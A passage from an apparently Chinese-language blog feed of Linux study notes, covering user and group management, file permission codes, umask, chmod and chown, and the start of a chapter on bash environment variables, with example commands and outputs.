align="center">必须和-m一起使用，将<code>/etc/skel</code>目录的内容复制到用户的HOME目录</td></tr><tr><td align="center">-m</td><td align="center">创建用户的HOME目录</td></tr><tr><td align="center">-M</td><td align="center">不创建用户的HOME目录（当默认设置里要求创建时才使用这个选项）</td></tr><tr><td align="center">-n</td><td align="center">创建一个与用户登录名同名的新组</td></tr><tr><td align="center">-r</td><td align="center">创建系统账户</td></tr><tr><td align="center">-p passwd</td><td align="center">为用户账户指定默认密码</td></tr><tr><td align="center">-s shell</td><td align="center">指定默认的登录shell</td></tr><tr><td align="center">-u uid</td><td align="center">为账户指定唯一的UID</td></tr></tbody></table><p>默认情况下， <code>useradd</code>命令不会创建HOME目录，但是<code>-m</code>命令行选项会使其创建HOME目录。 <code>useradd</code>命令创建了新HOME目录，并将<code>/etc/skel</code>目录中的文件复制了过来:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># useradd -m test</span><span class="token comment"># ls -al /home/test</span>total <span class="token number">24</span>drwxr-xr-x <span class="token number">2</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span> <span class="token number">4096</span> <span class="token number">2010</span>-09-23 <span class="token number">19</span>:01 <span class="token builtin class-name">.</span>drwxr-xr-x <span class="token number">4</span> root root <span class="token number">4096</span> <span class="token number">2010</span>-09-23 <span class="token number">19</span>:01 <span class="token punctuation">..</span>-rw-r--r-- <span class="token number">1</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span> <span class="token number">220</span> <span class="token number">2010</span>-04-18 <span class="token number">21</span>:51 .bash_logout-rw-r--r-- <span class="token number">1</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span> <span class="token number">3103</span> <span class="token number">2010</span>-04-18 <span class="token number">21</span>:51 .bashrc-rw-r--r-- <span class="token number">1</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span> <span class="token number">179</span> <span class="token number">2010</span>-03-26 08:31 examples.desktop-rw-r--r-- <span class="token number">1</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span> <span class="token number">675</span> <span class="token number">2010</span>-04-18 <span class="token number">21</span>:51 .profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时没有给用户设置登陆密码，可以用命令：<code>passwd test</code>修改密码，之后就可以用这个密码登录了。这里注意使用<code>useradd -p</code>命令时，后面跟的必须是加密后的密码，形如上面rich的<code>$1$.FfcK0ns$f1UgiyHQ25wrB/hykCn020$1$.FfcK0ns$f1UgiyHQ25wrB/hykCn020</code>。</p><p>可以在<code>-D</code>选项后跟上一个指定的值来修改系统默认的新用户设置:</p><table><thead><tr><th align="center">参 数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">-b default_home</td><td align="center">更改默认的创建用户HOME目录的位置</td></tr><tr><td align="center">-e expiration_date</td><td align="center">更改默认的新账户的过期日期</td></tr><tr><td align="center">-f inactive</td><td align="center">更改默认的新用户从密码过期到账户被禁用的天数</td></tr><tr><td align="center">-g group</td><td align="center">更改默认的组名称或GID</td></tr><tr><td align="center">-s shell</td><td align="center">更改默认的登录shell</td></tr></tbody></table><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># useradd -D -s /bin/tsch</span><span class="token comment"># useradd -D</span><span class="token assign-left variable">GROUP</span><span class="token operator">=</span><span class="token number">100</span><span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/home<span class="token assign-left variable">INACTIVE</span><span class="token operator">=</span>-1<span class="token assign-left variable">EXPIRE</span><span class="token operator">=</span><span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>/bin/tsch<span class="token assign-left variable">SKEL</span><span class="token operator">=</span>/etc/skel<span class="token assign-left variable">CREATE_MAIL_SPOOL</span><span class="token operator">=</span>yes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在， <code>useradd</code>命令会将<code>tsch shell</code>作为所有新建用户的默认登录shell。  </p><h4 id="7-1-4-删除用户"><a href="#7-1-4-删除用户" class="headerlink" title="7.1.4 删除用户"></a>7.1.4 删除用户</h4><p><code>userdel</code>可以从系统中删除用户。默认情况下， <code>userdel</code>命令会只删除<code>/etc/passwd</code>文件中的用户信息，而不会删除系统中属于该账户的任何文件。  加上<code>-r</code>参数， <code>userdel</code>会删除用户的HOME目录以及邮件目录。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># /usr/sbin/userdel -r test</span><span class="token comment"># ls -al /home/test</span>ls: cannot access /home/test: No such <span class="token function">file</span> or directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="7-1-5-修改用户"><a href="#7-1-5-修改用户" class="headerlink" title="7.1.5 修改用户"></a>7.1.5 修改用户</h4><table><thead><tr><th align="center">命令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>usermod</code></td><td align="center">修改用户账户的字段，还可以指定主要组以及附加组的所属关系</td></tr><tr><td align="center"><code>passwd</code></td><td align="center">修改已有用户的密码</td></tr><tr><td align="center"><code>chpasswd</code></td><td align="center">从文件中读取登录名密码对，并更新密码</td></tr><tr><td align="center"><code>chage</code></td><td align="center">修改密码的过期日期</td></tr><tr><td align="center"><code>chfn</code></td><td align="center">修改用户账户的备注信息</td></tr><tr><td align="center"><code>chsh</code></td><td align="center">修改用户账户的默认登录shell</td></tr></tbody></table><h5 id="1-usermod"><a href="#1-usermod" class="headerlink" title="1.usermod"></a>1.<code>usermod</code></h5><p><code>usermod</code>命令能修改<code>/etc/passwd</code>文件中的大部分字段，只需用与想修改的字段对应的命令行参数就可以了。参数大部分跟<code>useradd</code>命令的参数一样（比如， -c修改备注字段， -e修改过期日期， -g修改默认的登录组）。除此之外，还有另外一些可能派上用场的选项：</p><ul><li><code> -l</code>修改用户账户的登录名。</li><li><code> -L</code>锁定账户，使用户无法登录。</li><li><code> -p</code>修改账户的密码。</li><li><code> -U</code>解除锁定，使用户能够登录。  </li></ul><h5 id="2-passwd和chpasswd"><a href="#2-passwd和chpasswd" class="headerlink" title="2.passwd和chpasswd "></a>2.<code>passwd</code>和<code>chpasswd </code></h5><p> 改变用户密码的一个简便方法就是用passwd命令。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># passwd test</span>Changing password <span class="token keyword">for</span> user test.New UNIX password:Retype new UNIX password:passwd: all authentication tokens updated successfully.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>-e</code>选项能强制用户下次登录时修改密码。你可以先给用户设置一个简单的密码，之后再强制`在下次登录时改成他们能记住的更复杂的密码。  </p><h3 id="7-2-使用-Linux-组"><a href="#7-2-使用-Linux-组" class="headerlink" title="7.2 使用 Linux 组"></a>7.2 使用 Linux 组</h3><p>组权限允许多个用户对系统中的对象（比如文件、目录或设备等）共享一组共用的权限。</p><h4 id="7-2-1-etc-group-文件"><a href="#7-2-1-etc-group-文件" class="headerlink" title="7.2.1 /etc/group 文件"></a>7.2.1 <code>/etc/group </code>文件</h4><p>与用户账户类似，组信息也保存在系统的一个文件中。<code> /etc/group</code>文件包含系统上用到的每个组的信息。下面是一些来自Linux系统上<code>/etc/group</code>文件中的典型例子：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root:x:0:rootbin:x:1:root,bin,daemondaemon:x:2:root,bin,daemonsys:x:3:root,bin,admadm:x:4:root,adm,daemonrich:x:500:mama:x:501:katie:x:502:jessica:x:503:mysql:x:27:test:x:504:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <code> /etc/group</code>文件有4个字段：</p><ul><li> 组名</li><li> 组密码</li><li> GID</li><li> 属于该组的用户列表  </li></ul><p>和UID一样， GID在分配时也采用了特定的格式。系统账户用的组通常会分配低于500的GID值，而用户组的GID则会从500开始分配。   </p><p><font color="red" size="3">千万不能通过直接修改<code>/etc/group</code>文件来添加用户到一个组，要用<code>usermod</code>命令</font>（在7.1节中介绍过）。在添加用户到不同的组之前，首先得创建组。  </p><h4 id="7-2-2-创建新组"><a href="#7-2-2-创建新组" class="headerlink" title="7.2.2 创建新组"></a>7.2.2 创建新组</h4><p><code>groupadd</code>命令可在系统上创建新组：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># /usr/sbin/groupadd shared</span><span class="token comment"># tail /etc/group</span>haldaemon:x:68:xfs:x:43:gdm:x:42:rich:x:500:mama:x:501:katie:x:502:jessica:x:503:mysql:x:27:test:x:504:shared:x:505:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在创建新组时，默认没有用户被分配到该组。 <code>groupadd</code>命令没有提供将用户添加到组中的选项，但可以用<code>usermod</code>命令来弥补这一点:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># /usr/sbin/usermod -G shared rich</span><span class="token comment"># /usr/sbin/usermod -G shared test</span><span class="token comment"># tail /etc/group</span>haldaemon:x:68:xfs:x:43:gdm:x:42:rich:x:500:mama:x:501:katie:x:502:jessica:x:503:mysql:x:27:test:x:504:shared:x:505:rich, <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p><strong>警告</strong> 为用户账户分配组时要格外小心。如果加了<code>-g</code>选项，指定的组名会替换掉该账户的默认组。<code> -G</code>选项则将该组添加到用户的属组的列表里，不会影响默认组。  </p><hr><h4 id="7-2-3-修改组"><a href="#7-2-3-修改组" class="headerlink" title="7.2.3 修改组"></a>7.2.3 修改组</h4><p><code>groupmod</code>命令可以修改已有组的GID（加<code>-g</code>选项）或组名（加<code>-n</code>选项）。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># /usr/sbin/groupmod -n sharing shared</span><span class="token comment"># tail /etc/group</span>haldaemon:x:68:7.3 xfs:x:43:gdm:x:42:rich:x:500:mama:x:501:katie:x:502:jessica:x:503:mysql:x:27:test:x:504:sharing:x:505:test,rich<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="7-3-理解文件权限"><a href="#7-3-理解文件权限" class="headerlink" title="7.3 理解文件权限"></a>7.3 理解文件权限</h3><h4 id="7-3-1-使用文件权限符"><a href="#7-3-1-使用文件权限符" class="headerlink" title="7.3.1 使用文件权限符"></a>7.3.1 使用文件权限符</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">myh@VM-16-11-debian:/tmp/test$ <span class="token function">ls</span> -alFtotal <span class="token number">36</span>drwxr-xr-x <span class="token number">2</span> root root  <span class="token number">4096</span> Jan <span class="token number">25</span> <span class="token number">14</span>:29 ./drwxrwxrwt <span class="token number">9</span> root root <span class="token number">20480</span> Feb  <span class="token number">8</span> 06:43 <span class="token punctuation">..</span>/-rw-r--r-- <span class="token number">1</span> root root     <span class="token number">0</span> Jan <span class="token number">25</span> <span class="token number">14</span>:28 cho-rw-r--r-- <span class="token number">1</span> root root    <span class="token number">22</span> Jan <span class="token number">25</span> <span class="token number">14</span>:29 makefile-rw-r--r-- <span class="token number">1</span> root root    <span class="token number">68</span> Jan <span class="token number">23</span> <span class="token number">20</span>:14 test1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果的第一个字段就是描述文件和目录权限的编码。这个字段的<font color="#FF5E3A" size="3">第一个字符代表了对象的类型</font>：  </p><ul><li><code> -</code>代表文件</li><li><code> d</code>代表目录</li><li><code> l</code>代表链接</li><li><code> c</code>代表字符型设备</li><li><code> b</code>代表块设备</li><li><code> n</code>代表网络设备  </li></ul><p>之后有3组三字符的编码。每一组定义了3种访问权限：  </p><ul><li><code> r</code>代表对象是可读的</li><li><code> w</code>代表对象是可写的</li><li><code> x</code>代表对象是可执行的    </li></ul><p><font color="#FF5E3A" size="3">若没有某种权限，在该权限位会出现单破折线</font>。  这3组权限分别对应对象的3个安全级别：  </p><ul><li> 对象的属主</li><li> 对象的属组</li><li> 系统其他用户  </li></ul><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux7/202202082034798.png"></p><p>对应如下：</p><ul><li> rwx：文件的属主（设为登录名rich）</li><li> rwx：文件的属组（设为组名rich）</li><li> r-x：系统上其他人。  </li></ul><p>说明登录名为rich的用户可以读取、写入以及执行这个文件（可以看作有全部权限）。类似地， rich组的成员也可以读取、写入和执行这个文件。然而不属于rich组的其他用户只能读取和执行这个文件： w被单破折线取代了，说明这个安全级别没有写入权限。  </p><h4 id="7-3-2-默认文件权限"><a href="#7-3-2-默认文件权限" class="headerlink" title="7.3.2 默认文件权限"></a>7.3.2 默认文件权限</h4><p><code>umask</code>命令用来设置所创建文件和目录的默认权限。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">touch</span> newfile$ <span class="token function">ls</span> -al newfile-rw-r--r-- <span class="token number">1</span> rich rich <span class="token number">0</span> Sep <span class="token number">20</span> <span class="token number">19</span>:16 newfile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>touch</code>命令用分配给的用户账户的默认权限创建了这个文件。<code> umask</code>命令可以显示和设置这个默认权限。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">umask</span>0022$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>第一位代表了一项特别的安全特性，叫作粘着位（ sticky bit）。这部分内容会在7.5节详述。  </p><p>后面的3位表示文件或目录对应的<code>umask</code>八进制值。要理解<code>umask</code>是怎么工作的，得先理解<font color="#FF5E3A" size="3">八进制模式的安全性设置</font>。  </p><p>八进制模式的安全性设置先获取这3个rwx权限的值，然后将其转换成3位二进制值，用一个八进制值来表示。在这个二进制表示中，每个位置代表一个二进制位。因此，如果读权限是唯一置位的权限，权限值就是r–，转换成二进制值就是100，代表的八进制值是4。 </p><p>Linux系统上默认的八进制的<code>umask</code>值是0022，而我所创建的文件的八进制权限却是644，这是如何得来的呢？ </p><p><font color="red" size="3"><code>umask</code>值只是个掩码，它会屏蔽掉不想授予该安全级别的权限。</font>要把<code>umask</code>值从<font color="#FF5E3A" size="3">对象的全权限值</font>中减掉。文件的全权限的值是666（所有用户都有读和写的权限）；目录的则是777（所有用户都有读、写、执行权限）。   </p><p>在上例中，文件一开始的权限是666， 减去<code>umask</code>值022之后， 剩下的文件权限就成了644。 </p><p>可以用<code>umask</code>命令为默认<code>umask</code>设置指定一个新值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">umask</span> 026$ <span class="token function">touch</span> newfile2$ <span class="token function">ls</span> -l newfile2-rw-r----- <span class="token number">1</span> rich rich <span class="token number">0</span> Sep <span class="token number">20</span> <span class="token number">19</span>:46 newfile2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​      </p><h3 id="7-4-改变安全性设置"><a href="#7-4-改变安全性设置" class="headerlink" title="7.4 改变安全性设置"></a>7.4 改变安全性设置</h3><p>如果已经创建了一个目录或文件，需要改变它的安全性设置，在Linux系统上有一些工具能够完成这项任务。</p><h4 id="7-4-1-改变权限"><a href="#7-4-1-改变权限" class="headerlink" title="7.4.1 改变权限"></a>7.4.1 改变权限</h4><p><code>chmod</code>命令用来改变文件和目录的安全性设置。 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> options mode <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> mode参数可以使用八进制模式或符号模式进行安全性设置。 一般用八进制模式就可以了。 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">chmod</span> <span class="token number">760</span> newfile$ <span class="token function">ls</span> -l newfile-rwxrw---- <span class="token number">1</span> rich rich <span class="token number">0</span> Sep <span class="token number">20</span> <span class="token number">19</span>:16 newfile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>options</code>为<code>chmod</code>命令提供了另外一些功能。 -R选项可以让权限的改变递归地作用到文件和子目录。  </p><h4 id="7-4-2-改变所属关系"><a href="#7-4-2-改变所属关系" class="headerlink" title="7.4.2 改变所属关系"></a>7.4.2 改变所属关系</h4><p><code>chown</code>命令用来改变文件的属主，<code>chgr</code>p命令用来改变文件的默认属组。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chown</span> options owner<span class="token punctuation">[</span>.group<span class="token punctuation">]</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可用登录名或UID来指定文件的新属主。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># chown dan newfile</span><span class="token comment"># ls -l newfile</span>-rw-rw-r-- <span class="token number">1</span> dan rich <span class="token number">0</span> Sep <span class="token number">20</span> <span class="token number">19</span>:16 newfile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <code> chown</code>命令也支持同时改变文件的属主和属组 ：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># chown dan.shared newfile</span><span class="token comment"># ls -l newfile</span>-rw-rw-r-- <span class="token number">1</span> dan shared <span class="token number">0</span> Sep <span class="token number">20</span> <span class="token number">19</span>:16 newfile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果Linux系统采用和用户登录名匹配的组名，可以只用一个条目就改变二者：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># chown test. newfile</span><span class="token comment"># ls -l newfile</span>-rw-rw-r-- <span class="token number">1</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span> <span class="token number">0</span> Sep <span class="token number">20</span> <span class="token number">19</span>:16 newfile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>chown</code>命令采用一些不同的选项参数。<code> -R</code>选项配合通配符可以递归地改变子目录和文件的所属关系。<code> -h</code>选项可以改变该文件的所有符号链接文件的所属关系。  </p><hr><p><strong>说明</strong> 只有root用户能够改变文件的属主。任何属主都可以改变文件的属组，但前提是属主必须<br>是原属组和目标属组的成员。  </p><hr><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">chgrp</span> shared newfile$ <span class="token function">ls</span> -l newfile-rw-rw-r-- <span class="token number">1</span> rich shared <span class="token number">0</span> Sep <span class="token number">20</span> <span class="token number">19</span>:16 newfile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>用户账户必须是这个文件的属主，除了能够更换属组之外，还得是新组的成员。  </p><hr><p><font color="#FF9999" size="3">文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux7/202202062048582.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习-第六章</title>
      <link href="/posts/myh10013.html"/>
      <url>/posts/myh10013.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第六章：使用Linux环境变量"><a href="#第六章：使用Linux环境变量" class="headerlink" title="第六章：使用Linux环境变量"></a>第六章：使用Linux环境变量</h2><h3 id="6-1-什么是环境变量"><a href="#6-1-什么是环境变量" class="headerlink" title="6.1 什么是环境变量"></a>6.1 什么是环境变量</h3><p>bash shell用一个叫作环境变量（ environment variable）的特性来<font color="#FF5E3A" size="3">存储有关shell会话和工作环境的信息</font>（这也是它们被称作环境变量的原因）。这项特性允许你在内存中存储数据，以便程序或shell中运行的脚本能够轻松访问到它们。这也是存储持久数据的一种简便方法。在bash shell中，环境变量分为两类：</p><ul><li>全局变量</li><li>局部变量  </li></ul><h4 id="6-1-1-全局环境变量"><a href="#6-1-1-全局环境变量" class="headerlink" title="6.1.1 全局环境变量"></a>6.1.1 全局环境变量</h4><p>全局环境变量对于<font color="#FF5E3A" size="3">shell会话和所有生成的子shell</font>都是可见的。局部变量则<font color="#FF5E3A" size="3">只对创建它们的shell</font>可见。全局环境变量对那些所创建的子shell需要获取父shell信息的程序来说非常有用。  系统环境变量基本上都是使用全大写字母，以区别于普通用户的环境变量。  </p><p>查看全局变量，可以使用<code>env</code>或<code>printenv</code>命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/<span class="token comment"># printenv</span><span class="token assign-left variable"><span class="token environment constant">SHELL</span></span><span class="token operator">=</span>/bin/bash<span class="token assign-left variable"><span class="token environment constant">HISTSIZE</span></span><span class="token operator">=</span><span class="token number">3000</span><span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span>en_US.utf8<span class="token assign-left variable">JRE_HOME</span><span class="token operator">=</span>/usr/local/java/jdk-16.0.1+9/jre<span class="token assign-left variable">HISTTIMEFORMAT</span><span class="token operator">=</span>%F %T <span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span>/<span class="token assign-left variable"><span class="token environment constant">LOGNAME</span></span><span class="token operator">=</span>root<span class="token assign-left variable"><span class="token environment constant">XDG_SESSION_TYPE</span></span><span class="token operator">=</span>tty<span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 要<strong>显示个别环境变量</strong>的值，可以使用<code>printenv</code>命令，但是不要用<code>env</code>命令:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">printenv</span> <span class="token environment constant">HOME</span>/home/Christine$$ <span class="token function">env</span> <span class="token environment constant">HOME</span>env: <span class="token environment constant">HOME</span><span class="token builtin class-name">:</span> No such <span class="token function">file</span> or directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以使用echo显示变量的值。在这种情况下引用某个环境变量的时候，必须在<font color="#FF5E3A" size="3">变量前面加上一个美元符（ $）</font>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/<span class="token comment"># echo $HOME</span>/root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在echo命令中，在变量名前加上$可不仅仅是要显示变量当前的值。它能够<font color="#FF5E3A" size="3">让变量作为命令行参数</font>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/<span class="token comment"># ls $HOME</span>disk.sh  install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="6-1-2-局部环境变量"><a href="#6-1-2-局部环境变量" class="headerlink" title="6.1.2 局部环境变量"></a>6.1.2 局部环境变量</h4><p>局部环境变量只能在定义它们的进程中可见。事实上， Linux系统也默认定义了标准的局部环境变量。也可以定义自己的局部变量，这些变量被称为用户定义局部变量。  </p><p>在Linux系统并没有一个只显示局部环境变量的命令。<code> set</code>命令会显示为某个特定进程设置的<strong>所有环境变量</strong>，包括<strong>局部变量、全局变量以及用户定义变量。</strong>  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">set</span><span class="token assign-left variable"><span class="token environment constant">BASH</span></span><span class="token operator">=</span>/bin/bash<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token assign-left variable"><span class="token environment constant">BASH_ALIASES</span></span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token assign-left variable"><span class="token environment constant">BASH_ARGC</span></span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token assign-left variable"><span class="token environment constant">BASH_ARGV</span></span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token assign-left variable"><span class="token environment constant">BASH_CMDS</span></span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token assign-left variable"><span class="token environment constant">BASH_LINENO</span></span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token assign-left variable"><span class="token environment constant">BASH_SOURCE</span></span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token assign-left variable">colors</span><span class="token operator">=</span>/etc/DIR_COLORS<span class="token assign-left variable">my_variable</span><span class="token operator">=</span><span class="token string">'Hello World'</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过<code>printenv</code>命令能看到的全局环境变量都出现在了<code>set</code>命令的输出中。但在<code>set</code>命令的输出中<strong>还有其他一些环境变量</strong>，即局部环境变量和用户定义变量。  </p><hr><p><strong>说明</strong>  命令env、 printenv和set之间的差异很细微。 set命令会显示出全局变量、局部变量以及用户定义变量。它还会按照字母顺序对结果进行排序。 env和printenv命令同set命令的区别在于前两个命令不会对变量排序，也不会输出局部变量和用户定义变量。  </p><hr><h3 id="6-2-设置用户定义变量"><a href="#6-2-设置用户定义变量" class="headerlink" title="6.2 设置用户定义变量"></a>6.2 设置用户定义变量</h3><p>可以在bash shell中直接设置自己的变量。本节将介绍怎样在交互式shell或shell脚本程序中创建自己的变量并引用它们。  </p><h4 id="6-2-1-设置局部用户定义变量"><a href="#6-2-1-设置局部用户定义变量" class="headerlink" title="6.2.1 设置局部用户定义变量"></a>6.2.1 设置局部用户定义变量</h4><p>启动了bash shell（或者执行一个shell脚本），就能创建在这个shell<strong>进程内可见的局部变量</strong>了。可以<font color="#FF5E3A" size="3">通过等号给环境变量赋值，值可以是数值或字符串</font>。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># bash    //创建子进程</span>root@VM-16-11-debian:~<span class="token comment"># echo $myvar</span>root@VM-16-11-debian:~<span class="token comment"># myvar=hello</span>root@VM-16-11-debian:~<span class="token comment"># echo $myvar</span>helloroot@VM-16-11-debian:~<span class="token comment"># exit  //退出子进程</span><span class="token builtin class-name">exit</span>root@VM-16-11-debian:~<span class="token comment"># echo $myvar  //不可见其他进程的环境变量</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在每次引用my_variable 环境变量的值，只要通过<code>$my_variable</code>引用即可。</p><p>如果要给变量赋一个<strong>含有空格</strong>的字符串值，<font color="#FF5E3A" size="3">必须用引号来界定字符串的首和尾</font>。    </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token assign-left variable">my_variable</span><span class="token operator">=</span>Hello World-bash: World: <span class="token builtin class-name">command</span> not found$$ <span class="token assign-left variable">my_variable</span><span class="token operator">=</span><span class="token string">"Hello World"</span>$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>Hello World<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有单引号的话， bash shell会以为下一个词是另一个要执行的命令。注意，<strong>定义的局部环境变量用的是小写字母，而到目前为止你所看到的系统环境变量都是大写字母。</strong>  </p><p>记住，变量名、等号和值之间没有空格，这一点非常重要。如果在赋值表达式中加上了空格，bash shell就会把值当成一个单独的命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ my_variable <span class="token operator">=</span> <span class="token string">"Hello World"</span>-bash: my_variable: <span class="token builtin class-name">command</span> not found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="6-2-2-设置全局环境变量"><a href="#6-2-2-设置全局环境变量" class="headerlink" title="6.2.2 设置全局环境变量"></a>6.2.2 设置全局环境变量</h4><p>创建全局环境变量的方法是<font color="#FF5E3A" size="3">先创建一个局部环境变量，然后再把它导出到全局环境中</font>。通过<code>export</code>命令来完成，变量名前面不需要加$。    </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># echo $myvar</span>root@VM-16-11-debian:~<span class="token comment"># myvar="I am global now"</span>root@VM-16-11-debian:~<span class="token comment"># export myvar</span>root@VM-16-11-debian:~<span class="token comment"># bash  //创建子shell</span>root@VM-16-11-debian:~<span class="token comment"># echo $myvar</span>I am global nowroot@VM-16-11-debian:~<span class="token comment"># exit</span><span class="token builtin class-name">exit</span>root@VM-16-11-debian:~<span class="token comment"># echo $myvar</span>I am global now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改子shell中全局环境变量并不会影响到父shell中该变量的值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token assign-left 